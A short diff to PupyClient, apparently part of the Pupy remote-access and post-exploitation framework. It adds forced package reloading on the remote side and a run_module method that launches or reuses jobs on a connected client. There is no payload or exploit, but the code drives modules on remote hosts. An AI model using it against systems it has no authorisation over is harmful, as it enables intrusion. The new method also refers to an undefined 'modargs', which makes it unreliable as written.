@@ -23,6 +23,7 @@ from .PupyErrors import PupyModuleError
 import traceback
 import textwrap
 from .PupyPackagesDependencies import packages_dependencies, LOAD_PACKAGE, LOAD_DLL, EXEC
+from .PupyJob import PupyJob
 
 class PupyClient(object):
 	def __init__(self, desc, pupsrv):
@@ -196,6 +197,28 @@ class PupyClient(object):
 		if force or ( module_name not in self.conn.modules.sys.modules ):
 			self.conn.modules.pupyimporter.pupy_add_package(cPickle.dumps(modules_dic)) # we have to pickle the dic for two reasons : because the remote side is not authorized to iterate/access to the dictionary declared on this side and because it is more efficient
 			logging.debug("package %s loaded on %s from path=%s"%(module_name, self.short_name(), package_path))
+			if force and  module_name in self.conn.modules.sys.modules:
+				self.conn.modules.sys.modules.pop(module_name)
+				logging.debug("package removed from sys.modules to force reloading")
 			return True
 		return False
+
+	def run_module(self, module_name, args):
+		""" start a module on this unique client and return the corresponding job """
+		module_name=self.pupsrv.get_module_name_from_category(module_name)
+		mod=self.pupsrv.get_module(module_name)
+		if not mod:
+			raise Exception("unknown module %s !"%modargs.module)
+		pj=None
+		modjobs=[x for x in self.pupsrv.jobs.itervalues() if str(type(x.pupymodules[0]))== str(mod) and x.pupymodules[0].client==self]
+		if mod.daemon and mod.unique_instance and modjobs:
+			pj=modjobs[0]
+		else:
+			pj=PupyJob(self.pupsrv,"%s %s"%(module_name, args))
+			ps=mod(self, pj)
+			pj.add_module(ps)
+			self.pupsrv.add_job(pj)
+		pj.start(args)
+		return pj
+
 
